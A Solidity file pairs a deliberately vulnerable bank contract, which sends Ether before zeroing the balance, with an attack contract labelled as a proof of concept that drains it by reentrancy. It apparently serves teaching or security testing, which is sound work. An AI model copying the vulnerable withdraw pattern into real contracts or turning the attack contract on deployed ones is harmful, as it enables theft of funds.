// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

// Vulnerable Contract
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Vulnerable function: sends Ether before updating balance
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}

// Attack Contract (for manual testing/PoC)
contract Attack {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // Fallback is called when Bank sends Ether
    receive() external payable {
        if (address(bank).balance >= 1 ether && gasleft() > 10000) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
